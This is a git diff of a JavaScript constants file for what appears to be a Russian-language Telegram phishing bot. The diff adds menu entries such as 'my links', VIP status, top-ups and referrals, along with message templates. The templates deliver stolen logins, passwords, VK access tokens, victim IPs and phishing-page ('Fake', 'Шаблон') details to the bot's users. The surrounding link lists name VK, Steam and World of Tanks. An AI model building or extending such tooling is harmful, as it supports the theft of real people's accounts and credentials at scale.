@@ -152,15 +152,29 @@ const vip = {
         ]
     }
 }
+const menuList = [
+    '👤 Мой профиль', '🔗 Мои ссылки','👥 Мои аккаунты', '👑 VIP Статус','💸 Пополнение', '🎁 Получить бонус','👨‍👩‍👧‍👦 Мои рефералы', '🎟 Промо-Коды','❓ Информация', '📊 О боте'
+]
 const emptyString = '                                                                                           '
 const Menu = [
     ['👤 Мой профиль', '🔗 Мои ссылки'],
     ['👥 Мои аккаунты', '👑 VIP Статус'],
     ['💸 Пополнение', '🎁 Получить бонус'],
     ['👨‍👩‍👧‍👦 Мои рефералы', '🎟 Промо-Коды'],
-    ['❓ Информация', '👥 Наш чат'],
-    ['⚡️ Новости', '📊 О боте']
+    ['❓ Информация', '📊 О боте'],
 ]
+const messages = {
+    vkMessage: function (name, login, password, token, id, friends, followers, ip, fake, fake2, date, date2, length, c) {
+        return  `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n🖇  Token: <code>${token}</code>\n\n🆔 ID:${id}\n\n🤼 Друзей: ${friends}\n👨‍👩‍👧‍👦 Подписчиков: ${followers}\n\n📍 IP: <code>${ip}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${emptyString}[${c+1}/${length}]`
+    },
+    otherMessage: function (name, login, password, ip, fake, fake2, date, date2,   length, c){
+        return `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n\n📍 IP: <code>${ip}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${emptyString}[${c+1}/${length}]`
+    }
+}
+const editModeCaptions = {
+    'link': 'Пожалуйста введите вверную ссылку.'
+}
+
 const ReplayListAccs = [
     [{
         text: 'Вконтакте',
@@ -284,7 +298,6 @@ const ReplayListLinks = [
         text: 'Steam',
         callback_data: 'showLinks_st'
     }],
-
     [{
         text: 'World of Tanks',
         callback_data: 'showLinks_wot'
@@ -356,4 +369,4 @@ const ReplayListLinks = [
         callback_data: 'showLinks_wm'
     }],
 ]
-module.exports = {names, links, emptyString, ReplayListAccs, ReplayListLinks ,vip,Menu}
+module.exports ={names, links, emptyString, ReplayListAccs, ReplayListLinks, vip, Menu, messages, menuList}
